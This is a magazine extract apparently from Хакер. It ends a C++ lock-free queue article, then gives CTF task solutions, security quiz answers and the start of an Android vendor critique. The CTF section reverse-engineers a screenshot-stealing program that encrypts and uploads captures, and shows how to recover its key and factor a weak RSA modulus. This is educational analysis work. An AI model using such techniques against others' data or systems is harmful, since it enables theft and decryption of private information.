проявить определен ную сообразительность и не ударить в грязь лицом.
   Хорошая новость сос тоит в том, что устройство, на котором наше
ПО будет запущенно, принадлежит полностью нам, можно гру зить процессор
на 100%, и никто нас за это не поругает, главное — обсчитать как можно
больше пакетов и максимально не допустить потерь. Размер данных в UDP‐
датаграмме не может превышать 512 байт (к примеру).


АРХИТЕКТУРА ПРИЛОЖЕНИЯ
Из описания задачи сразу становится понятно, что без всех ядер ПК нам тут
не обойтись. Первое, что придет в голову более‐менее опытному разработ‐
чику, — это выделить один поток на прием вхо дящих датаграмм и соз дать пул
потоков для их обработки. Раз мер пула обычно делают равным количес тву
доступных ядер у машины.
   Так как по усло виям задачи нам разрешено максимально использовать
ресурсы системы, мы, чтобы упростить код (а следовательно, и снизить число
потенциальных ошибок) и умень шить задержку перед обработкой входящих
данных, будем крутить бесконечный цикл, пыта ющийся вычитать данные
из сокета на каждой итерации. Другими словами, ОС не будет усыплять наш
поток, если входящих данных нет, и, соответственно, не будет тратить такты
процессора на его пробуждение.
  Для потоков из пула, которые обрабатывают UDP‐пакеты, мы реализуем
очередь из этих самых пакетов. Как только главный поток получает датаг‐
рамму, он сразу кладет ее в очередь и пытается прочитать следующую пор‐
цию данных из сокета. Потоки пула при этом придерживаются той же модели
работы, что и main thread. В частности, они будут крутить цикл вычитки
пакетов из оче реди, не засыпая на ожидании, если оче редь пуста.
   Теперь надо немного напрячь мозг и подумать, что мы забыли учесть. Пос‐
кольку очередь — разделяемая структура данных, то работа с ней связана
с дополнительными рас ходами времени на синхронизацию. Как мы выяснили
немного выше, нам надо максимально избегать раз деляемых данных, пос‐
кольку это чре вато потенциальными ошиб ками и возникновением «узких
мест». К сожалению, пол ностью отказаться от очереди у нас не выйдет, но вот
снизить затраты на синхро низацию вполне можно.
  Вместо одной общей очереди для всех мы можем реализовать по отдель‐
ной очереди для каждого потока из пула обра бот ки данных. В этом слу чае
вероятность того, что thread, вычитывающий датаг раммы, зас нет, ожидая,
пока завершится операция записи в очередь главным потоком, значительно
уменьшается. Очередь для записи может выбираться по простейшему алго‐
ритму, например round‐robin.
  Конечно, мы могли бы использовать readers‐write lock, чтобы обеспечить
одновременно чтение из очереди потокам пула, когда не ведется запись.
Но проблема в том, что датаграммы будут сыпаться с большой частотой
и основная конкуренция за разделяемый ресурс у обработчиков данных ока‐
жется не друг с другом, а с главным потоком.


ОЧЕРЕДЬ
Итак, как мы уже поняли, сердце нашего мини‐ПО — структура данных, пре‐
доставляющая безопасный доступ к пакетам в многопоточной среде. Пос‐
кольку софт может пол ностью утилизировать ресурсы машины, на которой он
работает, мы можем сразу при запус ке аллоцировать максимальный объем
доступной нам памяти для очередей. В этом случае мы избежим затрат
на выделение новых кусков памяти ядром ОС для нашего процесса.
  Но нам придется решать, как работать дальше, если очередь заполнится.
ПО не может просто так взять и упасть, когда доступная память закончится,
поэтому у нас есть два варианта. Первый — при добавлении новых элементов
в очередь затирать самые старые. В этом случае мы получим клас сический
кольцевой буфер. Второй вариант — воз вра щать ошиб ку при попытке добав‐
ления элемента в пол ную очередь. Мы выберем пос ледний вариант, так как в
этом случае программа, а следова тельно, и поль зователь, сможет понять, что
мы не справляемся с нагрузкой.
   Таким образом, вырисовывается при мерный интерфейс класса, который
будет имплементировать нашу структуру данных. Назовем его RingQueue.
Класс будет иметь как минимум два метода: push и pop. Причем метод push(
) будет возвращать булев результат, где true обозначает успешное добав‐
ление в очередь, а false — очередь полна.
   Теперь, когда мы определились с общими принципами, по которым будет
работать наш класс, давай подумаем о реализации.


Ре ализация на осно ве std::mutex
Первое, что приходит в голову для имплементации класса RingQueue, —
это использовать STL vector в качестве хра нилища для элементов очереди
и STL mutex для защиты данных в многопоточной среде. Ниже представлен
код класса RingQueue на основе vector и mutex.


template <class T>
class RingQueue
{
  RingQueue(const RingQueue&) = delete;
  RingQueue(RingQueue&&) = delete;
  RingQueue& operator=(const RingQueue&) = delete;
  RingQueue& operator=(RingQueue&&) = delete;
public:
  explicit RingQueue(size_t size) :
    // Текущая реализация предоставляет доступ к n – 1 элементов.
    // Таким образом, чтобы быть прозрачными для клиентского кода,
увеличим количество
    // хранимых элементов на 1.
    m_container(size + 1)
  {
    assert(size);
  }
  template <class ... Args>
  bool push(Args ... args)
  {
    std::unique_lock<std::mutex> lock(m_mutex);
    if (m_pushPos == m_popPos)
      return false;
    auto& item = m_container.at(m_pushPos);
    auto tmp = T(args ...);
    item = std::move(tmp);
    m_pushPos = incrementPosition(m_pushPos);
    return true;
  }
  using PopCallback = std::function<void(const T&)>;
  void pop(PopCallback& callback)
  {
    std::unique_lock<std::mutex> lock(m_mutex);
    const auto popPos = incrementPosition(m_popPos);
    if (m_pushPos == popPos)
      return;
    auto& item = m_container.at(popPos);
    callback(item);
    m_popPos = popPos;
  }
private:
  size_t incrementPosition(size_t pos) { return (pos != m_container.
size() ‐ 1) ? pos + 1 : 0; }
private:
  std::vector<T> m_container;
  std::mutex m_mutex;
  volatile size_t m_popPos = 0;
  volatile size_t m_pushPos = 1;
};

С первых строк видно, что RingQueue является шаблонным классом. Это нап‐
рямую не относится к многопоточности, но таким образом мы достигаем нуж‐
ного уровня универсальнос ти. Тип T — это тип элементов, хранимых в оче‐
реди. В нашей реализации единс твенное требова ние к T — это поддержка
move‐семантики.
   Конструктор RingQueue в качестве параметра принимает свой размер
size и создает вектор длиной size + 1. Как мы говорили выше, оче редь
должна занять максимально возможный объем оперативной памяти. Единицу
к size мы прибавляем для того, что бы обес печить корректный доступ к эле‐
ментам по принципам кольцевого буфера.
  Метод push() — шаблонный метод, причем используется фича variadic
templates из C++ 11. Это также сделано для универсальности, чтобы иметь
возможность передать произвольное количество аргументов в вызов конс‐
труктора T(). Напрямую к многопоточности variadic templates не относится.
Внутри метода мы сразу же блокируем mutex, а затем пытаемся положить
элемент в очередь. Для это го мы первым делом смотрим, не полна ли оче‐
редь, сравнивая индекс вставки (m_pushPos) с индексом извлечения (m_pop‐
Pos). Если они равны, то считаем, что мест боль ше нет, и возвращаем false.
Если же очередь еще может принять новые элементы, мы получаем item
по индексу вставки, инициализируем его новыми значениями, а затем сдви‐
гаем на индекс вставки на следующую позицию.
  Особенность метода pop() в том, что ссылку на извлекаемый элемент он
возвращает через обратный вызов, а не с помощью опе ратора return. Метод
pop() может гарантировать неизменность извлекаемого элемента только
при заблокированном mutex. Выводя ссылку на элемент за блокировку, мы
автоматически получаем data race. Конечно, мы бы могли отдавать копию
объекта, но это лишние  затраты на вызов конструктора копирования,
в котором может происходить что угодно, в том числе какие‐то тяжелые опе‐
рации. В высоконагруженных приложениях такое крайне не рекомендуется.
С другой стороны, надо помнить, что поскольку обратный вызов осуществля‐
ется под блокировкой, то существу ет шанс deadlock в случае, если код call‐
back недостаточно щепетилен и каким‐то обра зом пытается повторно обра‐
титься к RingQueue.
  Но вернемся к описанию происхо дящего в pop(). После блокировки mu‐
tex мы первым делом сдвигаем индекс извлечения и проверяем, есть ли
что‐нибудь в очереди. Если индекс извлечения равен текущему индексу
вставки, то считаем, что очередь пус та, в противном случае достаем из век‐
тора нужный эле мент и отда ем ссылку на него клиентскому коду через
callback.
   Теперь давай еще раз взглянем на получившийся код. Основная его проб‐
лема в блокиров ке. Пока мы что‐то кладем в очередь в одном потоке, дру гой
поток не может достать нужный ему элемент для обра ботки и просто засыпа‐
ет. И наоборот, когда один поток вызывает метод pop(), другой простаивает,
ожидая, когда завершится вызов push(). Конечно, push() — очень легкий
метод и не занимает мно го тактов про цес сора. Но, во‐первых, мы не можем
сказать того же про операцию извлечения элемента (мы не знаем, что про‐
исходит при вызове callback), а во‐вторых, при высоких нагрузках вероятность
того, что потоки будут ждать друг друга, значительно увеличивается, нес‐
мотря на потенциальную легковес ность push/pop‐операций.


Оптимизирован ная реализация на осно ве std::mutex
Чтобы избежать описанной проблемы, вос пользуемся методом try_lock()
класса std::mutex. Эта функция пыта ется заблокировать мьютекс, но в случае,
если это успел сделать какой‐то другой поток, она возвращает false. Давайте
взглянем на модифицированный код push/pop‐методов.


template <class ... Args>
bool push(Args ... args)
{
  if (!m_mutex.try_lock())
    return false;
  std::lock_guard<std::mutex> lock(m_mutex, std::adopt_lock);
  // ...
}
using PopCallback = std::function<void(const T&)>;
void pop(PopCallback& callback)
{
  if (!m_mutex.try_lock())
    return;
  std::lock_guard<std::mutex> lock(m_mutex, std::adopt_lock);
  // ...
}

Как мы видим, обе функции члена клас са RingQueue немедленно завершают‐
ся, если один из потоков завладел мьютексом ранее. При этом метод push()
возвращает значение false, и клиентский код может попробовать вставить
элемент чуть позже или вообще дропнуть его.
   Таким нехитрым преобразованием мы получи ли lock free структуру данных.
Но у этого решения есть один огромный недос таток. Даже если оче редь
еще может принять новые элементы, сущес твует вероятность того, что встав‐
ка завершится неудачей. Это силь но сни жает общую ценность данного
решения, так как мы не будем обрабатывать значительное количество вхо‐
дящих пакетов.


Ре ализация на осно ве std::atomic
Наверняка многие разработчики, когда‐либо сталкивавшиеся с многопоточ‐
ным  программированием,  работали  с  ато марными  опе рациями
или хотя бы слышали о них. С их помощью можно сделать так, чтобы все CPU
в системе увидели изменения некоторой ячейки памяти одновременно.
В C++ для этого есть специальный шаб лонный класс std::atomic. Давай поп‐
робуем переписать наш RingQueue класс с использованием атомарных
переменных.


template <class ... Args>
bool push(Args ... args)
{
  const auto pushPos = m_pushPos.load();
  // Атомарное сравнение не нужно в данном случае
  if (m_popPos.load() == pushPos)
    return false;
  auto& item = m_container.at(pushPos);
  auto tmp = T(args ...);
  item = std::move(tmp);
  if (pushPos != m_container.size() ‐ 1)
    m_pushPos.fetch_add(1);
  else
    m_pushPos.store(0);
  return true;
}
using PopCallback = std::function<void(const T&)>;
void pop(PopCallback& callback)
{
  auto popPos = m_popPos.load();
  popPos = (popPos != m_container.size() ‐ 1) ? popPos + 1 : 0;
  // Атомарное сравнение не нужно в данном случае
  if (m_pushPos.load() == popPos)
    return;
  auto& item = m_container.at(popPos);
  callback(item);
  m_popPos.store(popPos);
}
std::atomic<size_t> m_popPos = {0};
std::atomic<size_t> m_pushPos = {1};

Как видно из кода, мы объявили m_popPos и m_pushPos атомарными
переменными. Метод load() типа atomic позволя ет получить текущее зна‐
чение переменной, а store() — синхрон но записать новое значение,
которое станет немед ленно доступно всем CPU. Кроме  того, функция
fetch_add() атомарно увеличивает зна чение переменной.
  На первый взгляд может показать ся, что atomic‐переменные должны
работать довольно быстро, но это не совсем так. Для синхронизации изме‐
нений в ячейке памяти ядра процессоров в общем случае выполняют доволь‐
но много сложных операций. Грубо говоря, каждый раз, когда мы изме няем
значение атомарной переменной, процессор тратит еще от нескольких
десятков до нескольких сотен тактов для того, чтобы синхронизи ровать это с
другими CPU системы. При час той перезаписи таких переменных мы получа‐
ем серьезную просадку производитель ности. Конечно, эти потери сильно
зависят от конкретной архитектуры процессора, но в той или иной степени
они есть всегда.


Оптимизирован ная реализация на осно ве std::atomic
К счастью, std::atomic поддерживает несколько видов семантики упорядо‐
чивания доступа. По умолчанию использует ся std::memory_order_seq_cst —
sequentially‐consistent,   или   последова тельно   согласованный   доступ.
Это самая строгая и понятная для разработчика семантика. При ее исполь‐
зовании работа с атомарными переменными в нескольких потоках выглядит
как однопоточный код. Дру гими сло вами, все потоки выполняемого процесса
видят изме нения ячейки памяти в одинаковом поряд ке. Обратная сторона
этой простоты — высокие накладные расходы, о которых говорилось выше.
  Для увеличения производитель нос ти можно использовать менее строгие
семантики, в частности семантику захвата‐освобождения (memory_order_ac‐
quire и memory_order_release) и семантику ослабленного упорядочивания
(memory_order_relaxed). К сожалению,  в рамках  данной  статьи  у  нас
не получится разоб раться с тем, что это такое и как это работает. Это доволь‐
но сложные концепции, которые требуют раз вернутых объяснений с деталь‐
ными примерами. Неправильный выбор семантики упорядочивания доступа
может сде лать поведение программы непредсказуемым. Но  к счастью,
на рабочий код, который использует продвинутое упорядочивание, мы пос‐
мотреть можем.


template <class ... Args>
bool push(Args ... args)
{
  auto pushPos = m_pushPos.load(std::memory_order_relaxed);
  if (m_popPos.load(std::memory_order_acquire) == pushPos)
    return false;
  auto& item = m_container.at(pushPos);
  auto tmp = T(args ...);
  item = std::move(tmp);
  pushPos = incrementPosition(pushPos);
  m_pushPos.store(pushPos, std::memory_order_release);
  return true;
}
using PopCallback = std::function<void(const T&)>;
void pop(PopCallback& callback)
{
  auto popPos = m_popPos.load(std::memory_order_relaxed);
  popPos = incrementPosition(popPos);
  if (m_pushPos.load(std::memory_order_acquire) == popPos)
    return;
  auto& item = m_container.at(popPos);
  callback(item);
  m_popPos.store(popPos, std::memory_order_release);
}


ТЕСТИРОВАНИЕ ПРОИЗВОДИТЕЛЬНОСТИ
Теперь у нас есть целых четыре варианта реализации класса RingQueue, каж‐
дый следующий лучше и быс трее предыду щего. Настало время проверить,
насколько хорошо работа ют наши реализации. Для этого мы напишем
небольшой тест на google benchmark фреймворке. Код теста можно увидеть
ниже.


class Item
{
public:
  uint64_t m_x = 0;
};
RingQueue<Item> queue(1000);
static void BM_PushPop(benchmark::State& state) {
  RingQueue<Item>::PopCallback callback([](const Item& item){
    volatile auto x = item.m_x;
    x += 1;
  });
  while (state.KeepRunning()) {
    if (state.thread_index == 0) {
      queue.push(42);
    } else {
      queue.pop(callback);
    }
  }
}
BENCHMARK(BM_PushPop)‐>Threads(2);

Бенчмарк создает очередь раз мером в 1000 элементов, а затем запускает
два потока, один из которых сохраня ет элементы в очередь, а другой извле‐
кает из нее. Цель — измерить среднее время вставки извлечения эле мента
из очереди. Тест довольно синтетичес кий, но поз волит оце нить произво‐
дительность каждого из решений. Для удобства восприятия результаты тес‐
тов собраны в таблицу.


 Тип решения                    Вре мя, наносе кун ды

 mutex                                245

  mutex::try_lock                        32

  atomic sequentially‐consistent            26

  atomic aquire‐release and relaxed          4

Как мы видим, каждое из введенных нами усовершенствований повышает
производительность вставки‐извлечения в разы. Самый примитивный вари‐
ант   с   использованием   std::mutex  выполняет  операции   push‐pop
за 245 наносекунд, а вот использование try_lock() улучшает быстродей‐
ствие более чем в семь раз. Оно и неуди витель но, ведь в первом варианте
RingQueue при высокой конкуренции за разделя емый ресурс наши потоки
значительную часть времени прос то спят.
  Переход от mutex::try_lock варианта к std::atomic с семантикой упорядо‐
чивания по умолчанию дает прирост производитель ности «все го» на 18%,
но при этом мы решаем проблему, при которой зна чительная часть вызовов
push() завершалась бы неудачно.
  Переход к тонкой нас тройке наших алгорит мов дос тупа к RingQueue
с помощью семантик захвата‐осво бож дения и ослабленного упорядочивания
дал нам, не побоюсь этого слова, фантастический результат в 4 наносе кунды.
Это более чем в 60 раз быстрее первоначального варианта.
  Конечно, не стоит рассматривать эти числа как абсолютные, они пред‐
ставляют ценность в сравнении друг с дру гом. Результат будет зависеть
от железа и уровня загрузки ресурсов системы. Для тес тов использовалась
следующая кон фигурация: Ubuntu  16.04,  Intel Core  i7 4790k, 16 Гбайт
DDR3 1600 МГц. Кроме того, наш бенчмарк не учи тывает количес тво неудач‐
ных попыток добавления в очередь. Этот параметр тоже важен для оценки
быстродействия класса RingQueue.
  Напоследок стоит напомнить, что как задача, так и тест производитель‐
ности — это сферический конь в вакууме. В реаль ных проектах мы име ем
гораздо больше усло вий, которые надо учитывать. Но на текущем примере
мы хорошо проследили, нас колько можно оптимизировать работу, казалось
бы, совсем незамысловатой утилиты, всего лишь немного пораз мышляв
над тем, как устроено современное мно гопоточное программирование.
КОДИНГ

ЗАДАЧИ
 НА СОБЕСЕДОВАНИЯХ


       ПОЛНЫЙ РАЗБОР ЗАДАЧ
    И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
            ОТ HACKERU





                                      Александр Лозовский
                                                     lozovsky@glc.ru





Настало время подвести итоги мартовских задач на собесе‐
дованиях и прославить тех парней, которые их с блеском
решили. Спасибо победителю — его решение оказалось
настолько подробным, что потянет на целую статью по кря‐
кингу. :)



НАШИ ПРИЗЕРЫ

Вот она, золотая пятерка чемпионов!
   Главный победитель, Егор Василен ко , получил обещанную стипендию
на сумму в 100 тысяч и написал офиген ное решение задач для нашего жур‐
нала, проиллюстрировав его двадцатью девятью лис тингами. Это просто пир
духа, огромное удовольствие для всех, кто интересуется взломом и форен‐
зикой!
  Сертификаты на меньшие суммы получили:
 1. Евгений Алек сан дро вич Аку лов
 2. eakj@protonmail.ch (неплохое ФИО, сразу видно настоящего анонима,
   респект)
 3. Ацамаз Марато вич Гацо ев (между про чим, семнадцать лет парню,
   а даст прикурить некото рым дядень кам от хакинга ;))
 4. Олег Евгеньевич Климов



РЕШЕНИЕ ОТ ПОБЕДИТЕЛЯ: ЗАДАНИЕ 1

Условие
На рабочем компьютере секретного агента была найдена подозрительная
программа, которая кра дет данные. Агент не растерял ся и снял дамп прог‐
раммы непосредственно перед отправкой зашифрованных данных.
   Требуется: найти флаг.


Ре шение
Проведем статический анализ дампа с помощью дизассемблера IDA.
  Обрати внимание, что файл был соб ран с отладочной информацией. Наз‐
вание pdb‐файла уже в некотором смыс ле служит подсказкой.





Формат EntryPoint’а свидетельству ет о том, что исполняемый файл написан
на языке C++.





Аналогичный вывод можно сделать при обнаружении функции WinMain,
с которой и следует начинать ана лиз. Функция WinMain выглядит следующим
образом.





В самом начале своей работы исследуемый процесс создает и отображает
окно приложе ния. Парамет ры окна являются аргу ментами функции Cre‐
ateWindowExW.





Более подробно о сообщениях и очередях сооб щений можно узнать здесь.
Важнее всего то, что функция обратного вызова TimerFunc срабаты вает каж‐
дый раз при вызове функции DispatchMessageW. Таким образом, анализ дам‐
па сводится к анализу функции TimerFunc.
  Переходим в функцию TimerFunc. Она опи сыва ется следующим псев‐
докодом.





Вот что здесь происходит:
 • процесс получает путь к файлу из директории %TEMP%;
 • получает параметры экрана: ширину и высоту;
 • последовательно выполняет функции, которые я наз вал Get_Screen, En
  crypt_Screen   и   Send_Screen    (функции   GdiplusStartup
   и GdiplusShutdown исполь зуются для инициализации Windows GDI+
   и окончания работы с Windows GDI+ соответственно).


Get_Screen
В функции Get_Screen исследуемый процесс делает скриншот экрана и сох‐
раняет его в файл fIsdWlasd.bin, который должен рас полагаться в дирек‐
тории %TEMP%.





Encrypt_Screen
После незначительных правок функция Encrypt_Screen выглядит так.





Чтобы понять, что здесь осуществляется шифрование, зайдем в Encrypt_‐
sub_3B1F50. В ней трудно не заметить вызовы таких функций, как EVP_CI‐
PHER_CTX_new, EVP_EncryptInit_ex, и дру гих функций из EVP, которые обес‐
печивают интерфейс высоко го уровня для функций из библиоте ки OpenSSL.
  Для того чтобы понять, какой алго ритм используется при шиф ровании,
идем сюда.





В функции Set_Cipher_Parameters_sub_CE1260 видим выбор параметров
блочного шифра.





А вызывается данная функция следующим обра зом.





Если сопоставить переда ваемые аргументы со значениями внутри Set_Ci‐
pher_Parameters_sub_CE1260, получится структура, где Name = 0 ("AES‐
"), Mode = 1 ("CBC") и KeyLength = 1 ("128‐").





Делаем вывод, что скриншот экра на шифруется алгоритмом AES‐128‐CBC
с помощью OpenSSL. Ключ шифрования берется из ресурсов.





Его можно без труда получить с помощью прог раммы Resource Hacker
или любого hex‐редактора.





Теперь мы знаем,  что скриншот шифруется алгоритмом AES‐128‐CBC
по известному нам ключу, но этого недостаточно. Для полноты анализа необ‐
ходимо узнать инициализиру ющий вектор, который используется в CBC‐
режиме.
  В EVP ключ шифрования и инициализиру ющий вектор передаются в фун‐
кцию EVP_EncryptInit_ex.





Немного поиграв со структурами данных в IDA, можно увидеть, что в качестве
инициализирующего вектора зло умышленник исполь зует ключ шифрования.





К слову, так делать нельзя.


Send_Screen
В функции Send_Screen выполняет ся отправка данных на сервер злоумыш‐
ленника.





Причем отправ ляется  тот самый зашифрованный файл fIsdWlasd.bin.
Содержимое зашифрованного файла, полученное с помощью функции Read‐
File, находится в переменной buf.





Так как по условию задания дамп процес са был снят непосредственно
перед отправкой зашифрованных данных, содержимое зашифрованного
файла все еще находится в памяти процесса.





Помимо этого, злоумышленник оста вил нам подсказку в виде размера
зашифрованного скриншота.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ

            ЗАДАЧИ
 НА СОБЕСЕДОВАНИЯХ
           ПОЛНЫЙ РАЗБОР ЗАДАЧ И НАГРАЖДЕНИЕ
                      ПОБЕДИТЕЛЕЙ ОТ HACKERU




Сохранить зашифрованный скриншот в файл можно прямо из IDA.





Флаг
Зная все параметры алго ритма шифрования, мы можем без труда восста‐
новить исходный скриншот из дампа, это и будет наш флаг.
   Python‐скрипт, с помощью которого можно получить исходный скриншот, я
положил сю да. Помимо это го, расшифровать скрин шот можно в OpenSSL:


> openssl enc ‐aes‐128‐cbc ‐d ‐in enc_screen ‐out dec_screen.jpeg ‐K
2682377FB2C7898E5EB781D941C09C5A ‐iv 2682377FB2C7898E5EB781D941C09C5A

А вот и флаг!





РЕШЕНИЕ ОТ ПОБЕДИТЕЛЯ: ЗАДАНИЕ 2

Условие
В вашем распоряжении ока залась зашифрованная информация в файле
flag.enc. Данный файл зашифрован алгоритмом AES‐256‐ECB. К счастью,
у вас есть ключ от зашифрованного файла key.enc. Проблема в том, что он
зашифрован алгоритмом RSA публичным ключом key.pub.
   Требуется: расшифро вать файл flag.enc и достать флаг.


Ре шение
Посмотрим, что собой представляет публичный ключ RSA.





Видим, что длина модуля составляет 256 бит. C таким модулем ни о какой
стойкости крип тосистемы говорить не приходится. Первое, что пришло
на ум, — факторизовать модуль с помощью YAFU.





Нам удалось получить разложение модуля на простые множители. Этого
вполне достаточно, чтобы сгенерировать секретный ключ RSA‐256 и рас‐
шифровать им key.enc. В OpenSSL есть возможность генерации секретного
клю ча RSA с помощью команды asn1parse. Для это го необходимо знать сле‐
дующие параметры клю ча:
 • modulus: модуль, в нашем случае


   modulus = 715212865554722993122522912465897092478494817507747
   32993492805730954699131789

 • pubExp: открытая экспонента, в нашем случае


   pubExp = 65537

 • privExp: секретная экспонента, элемент, обратный к pubExp по модулю


   ?(modulus) = (p ‐ 1) ? (q ‐ 1)

 • p: первый множитель modulus, в нашем случае


   p = 261857794043121448213410325750790838383

 • q: второй мно житель modulus, в нашем случае


   q = 273130256889334854338089243490350662083

 • e1: элемент, обратный к pubExp по модулю (p ‐ 1);
 • e2: элемент, обратный к pubExp по модулю (q ‐ 1);
 • coeff: элемент, обратный к q по модулю p.

Как правило, для нахождения обратно го элемента по модулю используют
расширенный алгоритм Евклида. Таким образом, все недостающие парамет‐
ры можно получить с помощью следующего Python‐скрипта. Ниже — резуль‐
тат работы скрипта.





Для того чтобы сгенерировать секретный ключ RSA, необходимо создать кон‐
фигурационный файл.





И выполнить набор команд в OpenSSL.





Здесь мы  сге нерирова ли  приватный  ключ  RSA‐256  в формате DER
по параметрам, указанным в asn1_struct, перевели его в формат PEM
и записали в файл key.priv. Теперь ничто не мешает нам расшифровать
ключ AES и достать флаг.





Можно заметить, что после расшифровки ключ AES имеет длину не 256,
а 128 бит. Поэтому реаль ный ключ выглядит так:


197b706e1595cf81c533136a2990249700000000000000000000000000000000

В OpenSSL это не име ет значения, но при расшифровке вручную может сыг‐
рать определенную роль.
   Флаг: Stvgn6CFHKYd3BDE



ПРАВИЛЬНЫЕ ОТВЕТЫ НА ТЕСТ

Честно говоря, я думал, что эти вопросы слишком прос тые, легко гуглятся
и публиковать их смысла нет. По результатам ока залось, что нашлись такие
невнимательные участники, которые накосячили даже в них. :) Так что — пуб‐
ликуем правильные ответы (выделены жир ным).
 1. При каком варианте спама зло умышленники вынуждены указывать нас‐
   тоящий обратный адрес?

     1. Фишинговые пись ма
     2. Ни герийские письма
     3. Малотиражная целевая спам‐рассылка с вредоносным вложением

 2. Возможна ли утечка данных пользователя, если он их вводит с виртуаль‐
   ной клавиатуры?

     1. Нет
     2. Нет, если на компь ютере заклеена видеокамера
     3. Да

 3. Выберите все из нижеперечисленных проблем, которые удается решить
   с помощью технологии соления паролей

     1. Вы бор слиш ком короткого пароля
     2. Неинформативность пароля
     3. Совпадение паролей у раз ных пользовате лей

 4. Какая из перечисленных вредоносных программ предназначена для атак
   на онлайн‐банкинг?

     1. Chameleon
     2. Virus.Win9x.CIH
     3. Carberp

 5. Какой вид атак на онлайн‐банкинг технически наиболее сложен и требует
   внедрения на атакуемом информационном ресурсе эксплоита?

     1. Phishing
     2. Man‐in‐the‐Middle
     3. Man-in-the-Endpoint

 6. В чем слабое место про токола Диффи — Хеллмана?

     1. Математическая осно ва этого протокола ненадежна
     2. Уяз вим по отно шению к атакам Man-in-the-Middle
     3. Стал уязвим по отношению к brute‐force attack с учетом выросших
     вычислительных воз можнос тей компьюте ров

 7. Какой метод DDOS‐атаки позволяет добиться многократного усиления
   трафика?

     1. UDP ﬂood
     2. Http slow post
     3. Dns amplification атака

 8. Какой хеш‐алгоритм работает быс трее?

     1. CRC32
     2. MD5
     3. SHA‐2

 9. Какие криптографичес кие методы используются в технологии блокчейн?

     1. Потоковое шифрование
     2. Хе широ вание
     3. Цифровая под пись

10. Выберите все правильные варианты ответа

     1. Формат HTTPS раз работан специально для нужд онлайн‐банкинга
     2. HTTPS является отдельным по сравнению с HTTP протоколом
     3. HTTPS — это расширение про токо ла HTTP, в котором добав-
     лено шифрование передаваемых по тран спортным механиз-
    мам про токо ла HTTP дан ных


IT-ком пании, шли те нам свои задач ки!
Миссия этой мини‐рубрики — образовательная, поэтому мы бесплатно пуб‐
ликуем качественные задачки, которые различные компании предлагают
соискателям. Вы шлете задачки на lozovsky@glc.ru — мы их публику ем.
Никаких актов, договоров, экспертиз и отчетностей. Читателям — задачки,
решателям — подарки, вам — рес пект от нашей многосоттысячной ауди‐
тории, пиарщикам — строчки отчетнос ти по публикациям в топовом компь‐
ютерном журнале.
GEEK
 ПЛОХОЙ
АНДРОИД





         КАК ПРОИЗВОДИТЕЛИ
     ПРЕВРАЩАЮТ ХОРОШУЮ ОС
    В ТОРМОЗНОЕ НЕОБНОВЛЯЕМОЕ
           УБОЖЕСТВО





В одном из предыдущих выпусков мы под‐
робно рас смотрели причины, по которым
смартфоны Apple были и будут быстрее
актуальных флагманов на Android. Статья
вызвала бурные обсуждения и неоднознач‐           Олег Афонин                                                                                      Эксперт по мобильной
ные реакции. В связи с этим мы решили       криминалистике«Элкомсофт»компании
развить и углубить тему, рассказав о тех        aoleg@voicecallcentral.com
палках, которые суют в колеса неплохой,
в  принципе,   системы  про изво дители
андроид‐смартфонов.


АНДРОИД ПЛОХОЙ И ХОРОШИЙ
В этой статье ничего не будет о багах и неудобствах чистого Android — неко‐
его эталона, состоящего из AOSP и сервисов Google, который устанавлива‐
ется в смартфоны линеек Android One, Google Pixel и смартфоны некоторых
производителей (например, Motorola и Nokia). Такой Android мы назовем
«хорошим»: нравятся тебе его особен ности или нет, но именно так он был
спроектирован. В сравнении с поделками про изводителей смартфонов
«хороший» Android чаще бывает удачно оптимизирован и с большей веро‐
ятностью будет регулярно обновлять ся — по край ней мере, у тех произво‐
дителей, которые сделали «чистый Android» сво ей маркетинговой фишкой.
   Здесь и сейчас мы погово рим о том, как производители — те самые HTC,
LG, Samsung и прочие — пытаются улучшить систему и что из этого получа‐
ется.


СВИСТЕЛКИ: БЛАГИЕ НАМЕРЕНИЯ ПО-АЗИАТСКИ
Первым, что нас встретит при включении любого новенького флагмана, будет
анимированная  заставка,  бут‐анимация.  Американские  производители
скромны: на iPhone и iPad в течение всей заг рузки мы имеем счастье наб‐
людать лишь белое статичное яблоко. Смартфо ны на Windows 10 Mobile раду‐
ют таким же статичным голубым логотипом Windows. Google значительно
менее скромна, выводя веселую раз ноцветную анимацию, которая еще и
отличается для разных версий Android.
   Что объединяет заставки этих произво дителей? Нас не беспокоят лиш‐
ними звуками.
   «ЛА‐ЛА‐ЛА!» — кричат телефо ны LG при вклю чении. «УПСС‐БУМЦ!» —
возвещает нам о загрузке флагман HTC всей мощью динамиков Boom Sound.
Самые разнообразные, но неизменно громкие трели издают смартфоны,
дооснащенные самой первой свистелкой, отвечающей азиатским представ‐
лениям о прекрасном. И если у китайской Lenovo, маскирующейся под аме‐
риканскую Motorola, эту свистелку можно будет отключить, то смартфон LG
или HTC, самопроизвольно перезагрузившийся пос реди ночи, непременно
уведомит об этом радостном событии сонного вла дельца.


УВЕДОМЛЕНИЯ
В Android отлично продуманная и прекрасно реализованная сис тема уведом‐
лений, на голову превосходящая реализацию уведомлений в iOS. Казалось
бы, что здесь можно улучшить? Увы, азиатские про изводители это сделать
сумели. Каждое такое улучшение вызывает разрушительный эффект.
   Начнем с HTC. По какой‐то причине обоз реватели повторя ют друг за дру‐
гом, что свежие поколения HTC Sense — это почти чистый Android, акку ратно
улучшенный в нужных местах. Извините, дорогие обозреватели, но «улуч‐
шить» Android кривыми руками не получится. Вот что сделали программисты
HTC с уведомлениями.
   «Что‐то после обновления пос тоянно начали зву ковые уведомления при‐
ходить от приложе ний, хотя по умолчанию стоит без зву ка и на семерке все
нормально работало», — жалуется пользователь. Далее сле дует развесистая
инструкция, куда заходить и как отключать звук для каждой установленной
и системной программы, а также для отдельных подкатегорий каждой прог‐
раммы. Результат — «Помогло, но не силь но — включения звука на смарте
стали реже, но не пропали».
  Смотрим на первый скриншот.





Что мы здесь видим? Самая обычная настройка  зву ков  уведомлений
из самого что ни на есть стандартного Android. Казалось бы, что здесь может
пойти не так? Настроили звук уведомлений на бес шумный режим и наслажда‐
емся покоем; телефон побеспокоит нас звонками, но не будет пищать, кри‐
чать или свиристеть на всю комнату на каждое полученное письмо.
  Прости, но разработчики HTC лучше зна ют, что тебе нужно. Как так — уве‐
домления, да без звука? И «улучшают» Android, добавив свою собс твенную
кривую надстрой ку дис кретного управления уведомлениями. Теперь все
(все!) твои приложения, сколько бы их ни было установлено на смартфоне,
плевать хотели на беззвучный режим уведомлений, который ты выбрал в нас‐
